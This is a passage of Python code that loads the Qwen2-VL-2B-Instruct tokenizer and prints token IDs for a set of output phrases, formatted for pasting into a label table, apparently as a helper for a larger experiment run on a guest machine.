def _load_tokenizer(model_id: str = "Qwen/Qwen2-VL-2B-Instruct"):
    try:
        from transformers import AutoProcessor
    except ImportError:
        print("[!] transformers not installed — run on guest inside vlm conda env",
              file=sys.stderr)
        sys.exit(1)
    print(f"Loading tokenizer: {model_id} ...")
    return AutoProcessor.from_pretrained(model_id).tokenizer


def print_phrase_ids() -> None:
    """
    Print Qwen2-VL token IDs for each OUTPUT_PHRASES string.
    Run on guest, then paste the token_ids into OUTPUT_TOKEN_LABELS.
    """
    tokenizer = _load_tokenizer()

    print("\n" + "=" * 70)
    print("OUTPUT_PHRASE token IDs  (paste into OUTPUT_TOKEN_LABELS)")
    print("=" * 70)
    for i, (phrase, (label, _)) in enumerate(zip(OUTPUT_PHRASES, OUTPUT_TOKEN_LABELS)):
        ids = tokenizer.encode(phrase, add_special_tokens=False)
        n_bytes = len(ids) * 8
        print(f"\n  [{i}] label={label!r}")
        print(f"  phrase : {phrase!r}")
        print(f"  ids    : {ids}")
        print(f"  n_tok={len(ids)}  L={n_bytes}B  n_phases={len(ids)}")

    print("\n" + "=" * 70)
    print("Ready-to-paste OUTPUT_TOKEN_LABELS:")
    print("=" * 70)
    print("OUTPUT_TOKEN_LABELS = [")
    for phrase, (label, _) in zip(OUTPUT_PHRASES, OUTPUT_TOKEN_LABELS):
        ids = tokenizer.encode(phrase, add_special_tokens=False)
        n_bytes = len(ids) * 8
        print(f"    ({label!r},")
        print(f"     {ids}),  # {len(ids)}tok/{n_bytes}B")
    print("]")


# ---------------------------------------------------------------------------
# main
